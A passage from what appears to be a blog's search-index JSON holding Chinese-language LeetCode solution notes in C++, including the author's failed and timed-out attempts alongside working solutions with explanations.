int radius) { int resx = 0, resy = 0; len = towers.size(); int maxPower = 0; for(int x = 0; x &lt;= 100; x++) { for(int y = 0; y &lt;= 100; y++) { int power = Power(x, y, towers, radius); if(power &gt; maxPower) { maxPower = power; resx = x; resy = y; } else if(power == maxPower) { bool smaller = (x &lt; resx) || (x == resx &amp;&amp; y &lt; resy); if(smaller) { resx = x; resy = y; } } } } return {resx, resy}; }}; 暴力！！就暴力，看见题干就完了，搜索空间有多大我就搜多大哈哈哈哈或或 优化123456789101112131415161718192021222324252627282930class Solution {public: int len; int Power(int x, int y, vector&lt;vector&lt;int&gt;&gt;&amp; towers, int radius) { int power = 0; for(int j = 0; j &lt; len; j++) { double d = sqrt((towers[j][0]-x)*(towers[j][0]-x) + (towers[j][1]-y)*(towers[j][1]-y)); if(d &lt;= radius) { power += towers[j][2]/(1+d); } } return power; } vector&lt;int&gt; bestCoordinate(vector&lt;vector&lt;int&gt;&gt;&amp; towers, int radius) { int resx = 0, resy = 0; len = towers.size(); int maxPower = 0; for(int x = 0; x &lt;= 50; x++) { for(int y = 0; y &lt;= 50; y++) { int power = Power(x, y, towers, radius); if(power &gt; maxPower) { maxPower = power; resx = x; resy = y; } } } return {resx, resy}; }}; 大于50的就没必要了，只会衰减","link":"/home/2022/11/01/LeetCode/LeetCode-%E5%88%B7%E9%A2%98%E6%80%BB%E7%BB%9317/"},{"title":"LeetCode-18","text":"1668. 最大重复子字符串1234567891011121314151617181920212223242526272829303132333435363738class Solution {public: int maxRepeating(string sequence, string word) { int len1 = sequence.size(); int len2 = word.size(); int maxk = 0, k = 0; for(int i = 0; i &lt; len1;) { bool flag = true; int next = i+1; bool flag1 = false; for(int j = 0; j &lt; len2; j++) { if(sequence[i+j] != word[j]) { flag = false; break; } if(!flag1 &amp;&amp; j != 0 &amp;&amp; sequence[i+j] == word[0]) { next = i+j; flag1=true; } } // cout &lt;&lt; i &lt;&lt; &quot; &quot; &lt;&lt; k &lt;&lt; &quot; &quot; &lt;&lt; maxk &lt;&lt; endl; if(flag) { k++; i += len2; } else { maxk = max(k, maxk); if(k == 0) { i+=1; } else { i = i-len2+1; } k = 0; } // cout &lt;&lt; i &lt;&lt; endl; } return max(maxk, k); }}; 笨方法，从右向左找，适当回溯 754. 到达终点数字解法11234567891011121314151617181920class Solution {public: int reachNumber(int target) { target = abs(target); int n = (sqrt(8.0*target+1)-1)/2; //8.0,防止int溢出 int sum = (n+1)*n/2; if(sum == target) { return n; } int diff = target-sum; if((n % 2 == 1 &amp;&amp; diff % 2 == 0) || (n % 2 == 0 &amp;&amp; diff % 2 == 1)) { n += 1; } else if(diff %2 == 1) { n += 2; } else { n += 3; } return n; }}; 这道题直接暴力搜索是不可行的，算法成为$ O( 2^{ target } ) $ 级别 考虑到只求步数，负数target可以转化成正数处理首先计算 $ sum = 1 + 2 + 3 + … + i + … + n &lt;= target $, 如果 $ sum==target $，则n就是步数否则对sum进行调整，记 $ diff = target-sum &lt;= n $ (一定小于n+1)，所以需要先减小sum，再加上几个数，使得新的sum等于target情况一，第i步改为向左，再加上n+1, 也就是 $ sum - 2i + n+1 $，调整前后的差为 $ delta = n + 1 -2i $, $ i = 1,2,3,…,n; delta = n-1, n-3, n-5 … $。这种情况对于diff奇数n偶数，或diff偶数n奇数的情况适用，总计步数n+1情况二，第i步改为向左，再加上n+1和n+2，也就是 $ sum - 2i + n+1 + n+2 $，调整前后的差为 $ delta = 2(n-i) + 3 $, $ i = 1,2,3,…,n; delta = 3, 5, 7, 9, … $。这种情况对于diff奇数且diff &gt;= 3的情况适用，总计步数n+2情况三，减去n+1,加上n+2，显然使用于diff=1的情况，总计步数n+2，可以和情况二合并情况四，以上没有覆盖到的情况，举个例子可知，总计步数n+3 解法2123456789101112131415161718class Solution {public: int reachNumber(int target) { target = abs(target); int sum = 0; int n = 0; while(sum &lt; target) { n++; sum += n; } if((sum-target) % 2 == 0) return n; while((sum-target)%2) { n++; sum += n; } return n; }}; 计算 $ sum=1+2+3+…+n &gt;= target $情况一：如果 $ diff = sum-target &lt;= n $ 是偶数，则步数就是n。 由于diff &lt;= n,所以可以让第i步变成向左，即 $ sum - 2i, i=0,1,2,3,…,n+1 $，则刚好可以变成target其他情况：如果diff是奇数，则继续在sum的基础上加n,直到diff为偶数 方法31234567891011121314class Solution {public: int reachNumber(int target) { target = abs(target); int sum = 0; int n = 0; while(sum &lt; target) { n++; sum += n; } if((sum-target) % 2 == 0) return n; return n + n%2 +1; }}; 根据方法1，调整的步数最多3步，进一步分析，当diff为奇数时，sum加几个数可以变成偶数，根据公式 $$ sum = n(n+1)/2 $$可知：n偶数，sum偶数，n+1奇数，sum=sum+n+1后sum变奇数$$ n = 4i, sum=2i(2i+1) $$ n奇数，sum奇数，n+1偶数，n+2奇数，sum=sum+n+1+n+2后sum变偶数$$ n = 4i+1, sum=(4i+1)(2i+1) $$n偶数，sum奇数，n+1奇数，sum=sum+n+1后sum变偶数$$ n = 4i+2, sum=(2i+1)(4i+3) $$n奇数，sum偶数，n+1偶数，n+2奇数sum=sum+n+1+n+2后sum变奇数$$ n = 4i+3, sum=(4i+3)(2i+2) $$ 由于diff为奇数，则sum为奇数时要变成偶数，否则变成奇数整理上面的讨论，可知调整的步数为n%2+1，总步数为n+n%2+1 1106. 解析布尔表达式1234567891011121314151617181920212223242526272829303132333435363738394041424344454647class Solution {private: const static int NOT = '!'; const static int AND = '&amp;'; const static int OR = '|';public: bool parseBoolExpr(string expression) { stack&lt;char&gt; ops; stack&lt;char&gt; value; int len = expression.size(); for(int i = 0; i &lt; len; i++) { if(expression[i] == 't' || expression[i] == 'f') { value.push(expression[i]); } else if(expression[i] == NOT || expression[i] == AND || expression[i] == OR) { ops.push(expression[i]); } else if(expression[i] == '(') { value.push('('); } else if(expression[i] == ')') { char op = ops.top(); ops.pop(); bool res = value.top() == 't'? true : false; value.pop(); if(op == NOT) { res = !res; if(!value.empty()) { value.pop(); } } else { while(!value.empty() &amp;&amp; value.top() != '(') { bool temp = value.top() == 't'? true : false; if (op == AND) { res &amp;= temp; } else if(op == OR) { res |= temp; } value.pop(); } if(!value.empty()) { value.pop(); } } value.push(res ? 't' : 'f'); } } return value.top() == 't'? true : false; }}; 就是写一个计算器，难点在于n元运算，需要在数值栈中保存括号，以判断每个操作作用于那些值 1678. 设计 Goal 解析器1234567891011121314151617181920class Solution {public: string interpret(string command) { string s; int len = command.size(); for(int i = 0; i &lt; len; i++) { if(command[i] == 'G') { s.push_back('G'); } else if(command[i] == '(') { if(command[i+1] == ')') { s.push_back('o'); } else { s.push_back('a'); s.push_back('l'); } } } return s; }}; 816. 模糊坐标123456789101112131415161718192021222324252627282930313233343536373839404142class Solution {public: int len; vector&lt;string&gt; ambiguousCoordinates(string s) { len = s.size(); vector&lt;string&gt; coord; for(int i = 2; i &lt; len-1; i++) { vector&lt;string&gt; n1; vector&lt;string&gt; n2; gen(move(s), 1, i, n1); int len1 = n1.size(); if(len1 &lt;=0) continue; gen(move(s), i, len-1, n2); int len2 = n2.size(); if(len2 &lt;= 0) continue; for(int k1 = 0; k1 &lt; len1; k1++) { for(int k2=0; k2&lt; len2; k2++) { coord.push_back(&quot;(&quot; + n1[k1] + &quot;, &quot; + n2[k2] + &quot;)&quot;); } } } return coord; } void gen(string&amp;&amp; s, int i, int j, vector&lt;string&gt;&amp; ret) { if(s[j-1] == '0' &amp;&amp; s[i] =='0' &amp;&amp; j-i&gt;1) { return; } if(s[j-1] == '0') { ret.push_back(s.substr(i, j-i)); return; } if(s[i] == '0') { ret.push_back(&quot;0.&quot; + s.substr(i+1, j-i-1)); return; } for(int k = i; k &lt; j-1; k++) { ret.push_back(s.substr(i, k-i+1) + &quot;.&quot; + s.substr(k+1, j-k-1)); } ret.push_back(s.substr(i, j-i)); return; }}; 1684. 统计一致字符串的数目1234567891011121314151617181920212223class Solution {public: int countConsistentStrings(string allowed, vector&lt;string&gt;&amp; words) { bool all[129] = {false}; for(char c : allowed) { all[c] = true; } int count = 0; for(string &amp;w : words ) { bool flag = true; for(char c : w) { if(!all[c]) { flag = false; break; } } if(flag) { count++; } } return count; }}; 位运算1234567891011121314151617181920212223class Solution {public: int countConsistentStrings(string allowed, vector&lt;string&gt;&amp; words) { int all = 0; for(char c : allowed) { all |= 1 &lt;&lt; (c-'a'); } int count = 0; for(string &amp;w : words ) { bool flag = true; for(char c : w) { if(!((all &gt;&gt; (c-'a'))&amp;1)) { flag = false; break; } } if(flag) { count++; } } return count; }}; 题中说明了 allowed只包含26个字母，所以用一个int就可以表示字符是否存在 764. 最大加号标志前缀和12345678910111213141516171819202122232425262728293031323334353637class Solution {public: int orderOfLargestPlusSign(int n, vector&lt;vector&lt;int&gt;&gt;&amp; mines) { vector&lt;vector&lt;int&gt;&gt; mat(n, vector&lt;int&gt;(n, 1)), x(n, vector&lt;int&gt;(n+1, n)),y(n+1, vector&lt;int&gt;(n, n)); for(auto mine : mines) { mat[mine[0]][mine[1]] = 0; } for(int i = n-1; i &gt;= 0; i--) { for(int j = n-1; j &gt;= 0; j--) { if(mat[i][j] == 1) { x[i][j] = x[i][j+1]; } else { x[i][j] = j; } if(mat[j][i] == 1) { y[j][i] = y[j+1][i]; } else { y[j][i] = j; } } } vector&lt;int&gt; miny(n, -1); int maxx = 0; for(int i = 0; i &lt; n; i++) { int minx = -1; for(int j = 0; j &lt; n; j++) { if(mat[i][j] == 0) { minx = j; miny[j] = i; } else { maxx = max(maxx, min(min(x[i][j] - j , j - minx), min(y[i][j] - i , i - miny[j]))); } } } return maxx; }}; 刚开始想用dp，但是想法不对，试了7.8次，最后想到正确的方法x, y记录点(i, j) 右测/下方第一个0的坐标，minx记录左方第一个0的坐标，miny记录上方第一个0的位置mat用来保存这个矩阵加号的阶数为(i, j)坐标到上下左右四个方向上最近的0的距离的最小值要注意特殊值的处理，右侧/下方没有0，则记其坐标为n,上方/左侧没有0记为-1 一直以为只有把某一侧的数全都加起来才算前缀和只要是把每个位置之前的一维线段或二维矩形预先存储，就叫做前缀和/积分图 大佬的解法1234567891011121314151617181920212223class Solution {public: int orderOfLargestPlusSign(int n, vector&lt;vector&lt;int&gt;&gt;&amp; mines) { vector&lt;vector&lt;int&gt;&gt; dp(n, vector&lt;int&gt;(n, n)); for (auto&amp; e : mines) dp[e[0]][e[1]] = 0; for (int i = 0; i &lt; n; ++i) { int left = 0, right = 0, up = 0, down = 0; for (int j = 0, k = n - 1; j &lt; n; ++j, --k) { left = dp[i][j] ? left + 1 : 0; right = dp[i][k] ? right + 1 : 0; up = dp[j][i] ? up + 1 : 0; down = dp[k][i] ? down + 1 : 0; dp[i][j] = min(dp[i][j], left); dp[i][k] = min(dp[i][k], right); dp[j][i] = min(dp[j][i], up); dp[k][i] = min(dp[k][i], down); } } int ans = 0; for (auto&amp; e : dp) ans = max(ans, *max_element(e.begin(), e.end())); return ans; }}; 其实仔细一看，和我是一样的，一个一维for两个二维for，但是很短dp存的是到最近的一个0的长度 优化空间123456789101112131415161718192021222324class Solution {public: int orderOfLargestPlusSign(int n, vector&lt;vector&lt;int&gt;&gt;&amp; mines) { vector&lt;vector&lt;int&gt;&gt; mat(n, vector&lt;int&gt;(n, n)); for(auto mine : mines) mat[mine[0]][mine[1]] = 0; for(int i = 0; i &lt; n; i++) { int l = -1,r = n,u = -1,d = n; for(int j = 0, k = n-1; j &lt; n; j++, k--) { l = mat[i][j] ? l : j; u = mat[j][i] ? u : j; r = mat[i][k] ? r : k; d = mat[k][i] ? d : k; mat[i][j] = min(mat[i][j], j - l); mat[j][i] = min(mat[j][i], j - u); mat[i][k] = min(mat[i][k], r - k); mat[k][i] = min(mat[k][i], d - k); } } int maxx = INT_MIN; for(vector&lt;int&gt;&amp; vec : mat) maxx = max(maxx, *max_element(vec.begin(), vec.end())); return maxx; }}; 参考大佬的方法，把我的思路优化成只用一个二维数组这里要注意mat初始化为n，如果初始化为1的话后面没办法找最小值。 462. 最小操作次数使数组元素相等 II前缀和1234567891011121314151617class Solution {public: int minMoves2(vector&lt;int&gt;&amp; nums) { int len = nums.size(); long long int minn = INT_MAX; vector&lt;int&gt; preSum(len, 0); preSum[0] = nums[0]; sort(nums.begin(), nums.end()); for(int i = 1; i &lt; len; i++) { preSum[i] = preSum[i-1] + nums[i]; } for(long long int i = 0; i &lt; len; i++) { minn = min(minn, (i+1)*nums[i] - preSum[i] + preSum[len-1] - preSum[i] - (len-i -1)*nums[i]); } return minn; }}; 先排序，假设第i个数是能使总体调整数最小的数，那么总的调整次数为$$ i \\times nums_i - \\sum_{ j=0 }^{ j=i-1 }(nums_i) + \\sum_{ j=i+1 }^{ j=n-1 }(nums_j) - (n - i -1) \\times nums_i $$$$ i = 0,1,…,n-1 $$并使用前缀和优化找他的最小值即可 数学方法123456789101112class Solution {public: int minMoves2(vector&lt;int&gt;&amp; nums) { int len = nums.size(); long long int sum = 0; sort(nums.begin(), nums.end()); for(long long int i = 0; i &lt; len; i++) { sum += abs(nums[i] - nums[len/2]); } return sum; }}; 排序后，中位数之一刚好就是所求元素假设 $ a_i a_j; i+j=len-1 $ 为两个待调整元素$ h $ 为最终调整后的数，那么 $$ h = a_j - d_j = d_i - a_i $$也就是 $$ a_j - a_i = d_j + d_i $$对于关于中心对称的数，不管要调整成他们中间的哪一个数，调整的步数之和总是 $ a_j - a_i $ 所以根本不需要知道最终调整成哪个数，只要计算对称位置的两个数的差值之和即可 123456789101112class Solution {public: int minMoves2(vector&lt;int&gt;&amp; nums) { int len = nums.size(); long long int sum = 0; sort(nums.begin(), nums.end()); for(long long int i = 0; i &lt; len/2; i++) { sum += nums[len-1-i] - nums[i]; } return sum; }}; 不排序找到第len/2小的数123456789101112class Solution {public: int minMoves2(vector&lt;int&gt;&amp; nums) { int len = nums.size(); nth_element(nums.begin(), nums.begin() + len/2, nums.end()); int sum = 0; for(int i = 0; i &lt; len; i++) { sum += abs(nums[i] - nums[len/2]); } return sum; }}; 自己实现partition 1234567891011121314151617181920212223242526272829303132333435363738394041class Solution {public: int minMoves2(vector&lt;int&gt;&amp; nums) { int len = nums.size(); int i = 0, j = len; int k = 0; for(;;) { k = partition(nums, i ,j); if(k == len/2) { break; } else if(k &gt; len/2) { j = k; } else { i = k+1; } } int sum = 0; for(int i = 0; i &lt; len; i++) { sum += abs(nums[i] - nums[k]); } return sum; } int partition(vector&lt;int&gt;&amp; nums, int i, int j) { int target = i; j--; while(i &lt; j) { while(j &gt; i &amp;&amp; nums[j] &gt;= nums[target]) { j--; } if(nums[j] &lt; nums[target])swap(nums[target], nums[j]); target = j; while(j &gt; i &amp;&amp; nums[i] &lt;= nums[target]) { i++; } if(nums[i] &gt; nums[target])swap(nums[target], nums[i]); target = i; } return i; }}; 太慢了。。。 去掉swap 123456789101112131415161718192021222324252627282930313233343536373839class Solution {public: int minMoves2(vector&lt;int&gt;&amp; nums) { int len = nums.size(); int i = 0, j = len-1; int k = 0; for(;;) { k = partition(nums, i, j); if(k == len/2) { break; } else if(k &gt; len/2) { j = k-1; } else { i = k+1; } } int sum = 0; for(int i = 0; i &lt; len; i++) { sum += abs(nums[i] - nums[k]); } return sum; } int partition(vector&lt;int&gt;&amp; nums, int i, int j) { int pivot = nums[i]; while(i &lt; j) { while(j &gt; i &amp;&amp; nums[j] &gt;= pivot) { j--; } nums[i] = nums[j]; while(j &gt; i &amp;&amp; nums[i] &lt;= pivot) { i++; } nums[j] = nums[i]; } nums[i] = pivot; return i; }}; 470. 用 Rand7() 实现 Rand10()123456class Solution {public: int rand10() { return rand()%10+1; }}; 满身反骨 202. 快乐数1234567891011121314151617181920class Solution {public: bool isHappy(int n) { while(n != 1) { n = next(n); if(n == 4) { return false; } } return true; } int next(int n) { int sum = 0; while(n) { sum += (n%10)*(n%10); n /= 10; } return sum; }}; 大家都有相同的循环节 快慢指针12345678910111213141516171819202122class Solution {public: bool isHappy(int n) { int nn = n; do { n = next(n); nn = next(nn); if(nn == 1) return true; nn = next(nn); if(nn == 1) return true; } while(n != nn); return false; } int next(int n) { int sum = 0; while(n) { sum += (n%10)*(n%10); n /= 10; } return sum; }}; 123456789101112131415161718192021class Solution {public: bool isHappy(int n) { int nn = n; do { n = next(n); if(n == 1) return true; nn = next(nn); nn = next(nn); } while(n != nn); return false; } int next(int n) { int sum = 0; while(n) { sum += (n%10)*(n%10); n /= 10; } return sum; }}; 790. 多米诺和托米诺平铺12345678910111213141516171819202122232425262728293031class Solution {public: vector&lt;double&gt; frac; int sum = 0; int numTilings(int n) { frac = vector&lt;double&gt;(n+1, 1); for(int i = 2; i &lt;= n; i++) { frac[i] = (i * frac[i-1]); } calcualte(n, n, 0, 1); return sum; } void calcualte(int k, int n, int count, double div) { if(k &gt;= 3) { for(int i = n/k; i &gt;= 0; i--) { double div1 = (div*frac[i]); for(int j = (n-i*k)/k; j &gt;= 0; j--) { calcualte(k-1, n - i*k - j*k, count + i + j, (div1*frac[j]) ); } } } else if(k == 2) { for(int i = n/k; i&gt;=0; i--) { calcualte(k-1, n-i*k, count + i, (div*frac[i])); } } else { sum = int(sum + frac[count + n]/div/frac[n])%1000000007; } }}; 没通过，思路不对，算阶乘溢出，找出所有组合的代价也太大 在这个地方我犯了一个错误，就是认为 $ \\frac{a}{b} \\quad mod\\quad c = \\frac{a\\quad mod\\quad c}{b\\quad mod\\quad c} $正确的关系是， $ \\frac{a}{b}\\quad mod\\quad c = \\frac{a\\quad mod\\quad (b \\cdot c)}{b} $ ，证明：$ \\frac{a}{b}\\quad mod\\quad c = k $$ \\frac{a}{b} = x \\cdot c + k $$ a = b \\cdot x \\cdot c + b \\cdot k $$ a\\quad mod\\quad (b \\cdot c) = b \\cdot k $$ a\\quad mod\\quad (b \\cdot c) / b = k $$ \\frac{a}{b}\\quad mod\\quad c = \\frac{a\\quad mod\\quad (b \\cdot c)}{b} $ $ a^n \\quad mod \\quad c = (a \\cdot a^{n-1}) \\quad mod \\quad c = ((a \\quad mod \\quad c) \\cdot (a^{n-1} \\quad mod \\quad c)) \\quad mod \\quad c$ dp123456789101112131415#define MOD 1000000007class Solution {public: int numTilings(int n) { vector&lt;vector&lt;long long&gt;&gt; dp(n+1, vector&lt;long long&gt;(4, 0)); dp[0][3] = 1; for(int i = 1; i &lt;= n; i++) { dp[i][0] = dp[i-1][3]; dp[i][1] = (dp[i-1][0] + dp[i-1][2])%MOD; dp[i][2] = (dp[i-1][0] + dp[i-1][1])%MOD; dp[i][3] = (dp[i-1][0] + dp[i-1][1] + dp[i-1][2] + dp[i-1][3])%MOD; } return dp[n][3]; }}; 快速幂123456789101112131415161718192021222324252627282930313233343536373839404142434445464748#define MOD 1000000007class Solution {public: int numTilings(int n) { vector&lt;vector&lt;long long&gt;&gt; pow = { {0,0,0,1}, {1,0,1,0}, {1,1,0,0}, {1,1,1,1} }, base = { {0,0,0,0}, {0,0,0,0}, {0,0,0,0}, {1,0,0,0} }; pow = matPow(pow, n, 4); base = matMul(pow, base, 4, 4, 4); return base[3][0]; } vector&lt;vector&lt;long long&gt;&gt; matPow(vector&lt;vector&lt;long long&gt;&gt;&amp; a, int pow, int m) { vector&lt;vector&lt;long long&gt;&gt; res(m, vector&lt;long long&gt;(m)); for(int i = 0; i &lt; m; i++) { res[i][i] = 1; } while(pow) { if(pow&amp;1) { res = matMul(a, res,m,m,m); } a = matMul(a, a,m,m,m); pow = pow &gt;&gt; 1; } return res; } vector&lt;vector&lt;long long&gt;&gt; matMul(vector&lt;vector&lt;long long&gt;&gt;&amp; a, vector&lt;vector&lt;long long&gt;&gt;&amp; b, int m, int n, int k) { vector&lt;vector&lt;long long&gt;&gt; c(m, vector&lt;long long&gt;(k)); for(int i = 0; i &lt; m; i++) { for(int j = 0; j &lt; k; j++) { int sum = 0; for(int l = 0; l &lt; n; l++) { sum = (sum + (a[i][l]*b[l][j])%MOD)%MOD; } c[i][j] = sum; } } return c; }}; 791. 自定义字符串排序1234567891011121314class Solution {public: string customSortString(string order, string s) { int lenO = order.size(); int argOrder[26] = {0}; for(int i = 0; i &lt; lenO; i++) { argOrder[order[i]-'a'] = i+1; } sort(s.begin(), s.end(), [&amp;](char x, char y) -&gt; bool{ return argOrder[x-'a'] &lt; argOrder[y-'a']; }); return s; }};","link":"/home/2022/11/07/LeetCode/LeetCode-%E5%88%B7%E9%A2%98%E6%80%BB%E7%BB%9318/"},{"title":"LeetCode-19","text":"1710. 卡车上的最大单元数1234567891011121314151617181920class Solution {public: int maximumUnits(vector&lt;vector&lt;int&gt;&gt;&amp; boxTypes, int truckSize) { sort(boxTypes.begin(), boxTypes.end(), [](vector&lt;int&gt;&amp; x, vector&lt;int&gt;&amp; y)-&gt;bool { return x[1] &gt; y[1]; }); int n = boxTypes.size(); int ret = 0; for(int i = 0; i &lt; n; i++) { if(truckSize) { ret += min(truckSize, boxTypes[i][0])*boxTypes[i][1]; truckSize -= min(truckSize, boxTypes[i][0]); } else { break; } } return ret; }};// 50 + 27 + 14 = 91 简单题，排个序就行 775. 全局倒置与局部倒置1234567891011class Solution {public: bool isIdealPermutation(vector&lt;int&gt;&amp; nums) { for (int i = 0; i &lt; nums.size(); i++) { if (abs(nums[i] - i) &gt; 1) { return false; } } return true; }}; 最开始想复杂了，想用差分数组统计个数 39. 组合总和1234567891011121314151617181920212223242526class Solution {public: int n; int target; vector&lt;vector&lt;int&gt;&gt; res; vector&lt;vector&lt;int&gt;&gt; combinationSum(vector&lt;int&gt;&amp; candidates, int target) { this-&gt;target = target; n = candidates.size(); vector&lt;int&gt; vec; search(0, 0, vec, move(candidates)); return res; } void search(int index, int sum, vector&lt;int&gt; &amp; vec, vector&lt;int&gt;&amp;&amp; candidates) { if(sum == target) { res.push_back(vec); return; } if(sum &gt; target) return; vec.push_back(candidates[index]); search(index, sum+candidates[index], vec, move(candidates)); vec.pop_back(); if(index+1 &lt; n) { search(index+1, sum, vec, move(candidates)); } }}; 硬搜，不要重复就好了 792. 匹配子序列的单词数超时1123456789101112131415161718192021222324252627282930313233class Solution {public:int n; int numMatchingSubseq(string s, vector&lt;string&gt;&amp; words) { n = s.size(); int count = 0; int len = words.size(); for(int i = 0; i &lt; len; i++) { if(isSubstr(move(s), move(words[i]))) { count++; } } return count; } bool isSubstr(string&amp;&amp; s, string&amp;&amp; word) { int nw = word.size(); vector&lt;vector&lt;int&gt;&gt; dp(n, vector&lt;int&gt;(nw, 0)); dp[0][0]=(word[0]==s[0]); for(int i=1;i&lt;n;i++) { dp[i][0] = max(dp[i-1][0], int(word[0]==s[i])); } for(int i=1;i&lt;nw;i++){ dp[0][i] = max(dp[0][i-1], int(s[0]==word[i])); } for(int j = 1; j &lt; nw; j++) { for(int i = 1; i &lt; n; i++) { dp[i][j] = max(dp[i-1][j-1] + int(s[i] == word[j]),max(dp[i-1][j],dp[i][j-1])); } } //cout &lt;&lt; dp[n-1][nw-1] &lt;&lt; endl; return dp[n-1][nw-1]==nw; }}; 超时212345678910111213141516171819202122232425262728class Solution {public:int n; int numMatchingSubseq(string s, vector&lt;string&gt;&amp; words) { n = s.size(); int count = 0; int len = words.size(); unordered_map&lt;string, bool&gt; m; for(int i = 0; i &lt; len; i++) { if(m.count(words[i])) { count++; } else if(isSubstr(move(s), move(words[i]))) { m[words[i]] = true; count++; } } return count; } bool isSubstr(string&amp;&amp; s, string&amp;&amp; word) { int nw = word.size(); for(int i = 0, j = 0; i &lt; nw; i++) { for(;j&lt;n &amp;&amp; word[i] != s[j]; j++); if(j == n) return false; j++; } return true; }};","link":"/home/2022/11/15/LeetCode/LeetCode-%E5%88%B7%E9%A2%98%E6%80%BB%E7%BB%9319/"},{"title":"LeetCode-2","text":"20. 有效的括号思路 创建一个栈 遍历字符串 如果是左半部分，把这个字符压栈 如果是右半部分，先看一下栈顶元素和它是否配对，如果配对，弹栈，不配对，结束，返回false 字符串遍历结束后，看栈是否已经空了，如果没空，说明左右括号数量不对应false AC代码123456789101112131415161718192021222324static const auto __ = []() { ios::sync_with_stdio(false); cin.tie(nullptr); return nullptr;}();class Solution {public: bool isValid(string s) { int p[128] = {0}; p['('] = ')'; p[')'] = 0; p['['] = ']'; p[']'] = 0; p['{'] = '}'; p['}'] = 0; stack&lt;char&gt; sta; for (int i = 0; i &lt; s.length(); i++) { if (p[s[i]]) { sta.push(s[i]); } else { if (sta.empty() || p[sta.top()] != s[i]) return false; sta.pop(); } } return sta.empty(); }}; 26. 删除排序数组中的重复项第一次AC代码1234567class Solution {public: int removeDuplicates(vector&lt;int&gt;&amp; nums) { nums.erase(unique(nums.begin(), nums.end()), nums.end()); return nums.size(); }}; 我知道这样很不道德，所以 思路 双指针法 一个数用来遍历一遍数组，一个用来记录当前不重复的数的位置 每次循环把j指向的数赋值给i 当j指向的数与当前数不等的时候，i++，这样下一个不重复的数放到了它的后面 第二次AC代码12345678910111213class Solution {public: int removeDuplicates(vector&lt;int&gt;&amp; nums) { if (!nums.size()) return 0; int i = 0; for (int j = 1; j &lt; nums.size(); j++) { if (nums[i] != nums[j]) i++; nums[i] = nums[j]; } return i + 1; }}; 27. 移除元素思路1类似上一题的双指针法i用于循环变量当i指向的值不是要删除的元素时，把i的值赋值给当前的j，j再自增每次循环，i自增 思路2把要删除的值移动到数组的末尾 一个n，记录数组的长度 遍历数组，每找到一个要删除的值，把它和n-1指向的元素赋值给它，数组长度n自减，这个时候指针不要移动，因为要判断刚才末尾的那个数是不是也是要删除的 思路3iterator遍历，调用vector的erase直接删 AC代码（从上到下依次是三个思路）1234567891011121314class Solution {public: int removeElement(vector&lt;int&gt;&amp; nums, int val) { int j = 0; for (int i = 0; i &lt; nums.size(); i++) { if (nums[i] != val) { nums[j] = nums[i]; j++; } } return j; }}; 12345678910111213141516class Solution {public: int removeElement(vector&lt;int&gt;&amp; nums, int val) { int n = nums.size(); int i = 0; while (i &lt; n) { if (nums[i] == val) { nums[i] = nums[n-1]; n--; } else { i++; } } return n; }}; 123456789101112class Solution {public: int removeElement(vector&lt;int&gt;&amp; nums, int val) { for (vector&lt;int&gt;::iterator i = nums.begin(); i != nums.end(); i++) { if (*i == val) { nums.erase(i); i--; } } return nums.size(); }}; 28. 实现strStr()AC代码1234567891011121314class Solution {public: int strStr(string haystack, string needle) { if (!needle.length()) return 0; if (haystack.length() &lt; needle.length()) return -1; int n = needle.length(); for (int i = 0; i &lt; haystack.length() - n + 1; i++) { if (haystack.substr(i, n) == needle) { return i; } } return -1; }}; 35. 搜索插入位置思路就是遍历搜索+插入排序，两个算法混合起来就完了 AC代码123456789101112131415161718class Solution {public: int searchInsert(vector&lt;int&gt;&amp; nums, int target) { if (target &gt; *(nums.end() - 1)) { nums.insert(nums.end(), target); return nums.size() - 1; } for (int i = 0; i &lt; nums.size(); i++) { if (nums[i] &gt;= target) { if (nums[i] &gt; target) { nums.insert(nums.begin() + i, target); } return i; } } return nums.size(); }}; 38. 报数思路和之前的1084 外观数列(PAT (Basic Level) Practice)是一样的，不同点是外观数列是a有x个，这道题是x个a AC代码1234567891011121314151617181920212223242526272829303132static const auto __ = []() { ios::sync_with_stdio(false); cin.tie(nullptr); return nullptr;}();class Solution {public: string countAndSay(int n) { return ItWasPAT(n); } void add(string&amp; str, char c, int&amp; n) { char toNum[1024] = {0}; sprintf(toNum, &quot;%d&quot;, n); str.append(toNum); str.append(&amp;c, 1); n = 0; } string ItWasPAT (int n) { string d = &quot;1&quot;; string&amp; temp = d; for (int i = 0, count = 1; i &lt; n - 1; i++, count = 1) { string next = &quot;&quot;; for (int j = 1; j &lt; temp.length(); j++, count++) if (temp[j - 1] != temp[j]) add(next, temp[j - 1], count); add(next, temp[temp.length() - 1], count); temp = next; } return temp; }}; 53. 最大子序和思路这道题不会，直接抄的评论区代码。大一上，还没学动态规划 AC代码1234567891011121314class Solution {public: int maxSubArray(vector&lt;int&gt;&amp; nums) { if (!nums.size()) return 0; int ans = nums[0]; int sum = nums[0]; for (int i = 1; i &lt; nums.size(); i++) { if (sum &gt; 0) sum += nums[i]; else sum = nums[i]; ans = ans &lt; sum ? sum : ans; } return ans; }}; 83. 删除排序链表中的重复元素思路 链表是有序的 两个指针，一个指针i指向不重复的位置，一个j用来遍历 当j的值和i不一样时，让i的next指向j的next，j再往后移，由于这时候要访问j-&gt;next，要判断是否为NULL，如果是的话，说明结束了，让i-&gt;next为NULL 这时不要移动i，最后几个元素重复的话，这样会非法访问 这个算法放在java上更好，因为这样做没有delete，内存泄漏可是重罪 AC代码123456789101112131415161718192021222324252627282930313233343536/** * Definition for singly-linked list. * struct ListNode { * int val; * ListNode *next; * ListNode(int x) : val(x), next(NULL) {} * }; */static const auto __ = []() { ios::sync_with_stdio(false); cin.tie(nullptr); return nullptr;}();class Solution {public: ListNode* deleteDuplicates(ListNode* head) { if (head == NULL) return NULL; ListNode *i = head, *j = head-&gt;next; int n = 0; while (j != NULL) { if (i-&gt;val == j-&gt;val) { if (j-&gt;next != NULL) { i-&gt;next = j-&gt;next; j = j-&gt;next; } else { i-&gt;next = NULL; break; } } else { i = j; j = j-&gt;next; } } return head; }}; AC代码（内存不泄漏版本）123456789101112131415161718192021222324252627282930/** * Definition for singly-linked list. * struct ListNode { * int val; * ListNode *next; * ListNode(int x) : val(x), next(NULL) {} * }; */static const auto __ = []() { ios::sync_with_stdio(false); cin.tie(nullptr); return nullptr;}();class Solution {public: ListNode* deleteDuplicates(ListNode* head) { ListNode *i = head, *de; if (i == NULL || i-&gt;next == NULL) return head; while (i-&gt;next != NULL) { if (i-&gt;val == i-&gt;next-&gt;val) { de = i-&gt;next; i-&gt;next = i-&gt;next-&gt;next; delete de; } else { i = i-&gt;next; } } return head; 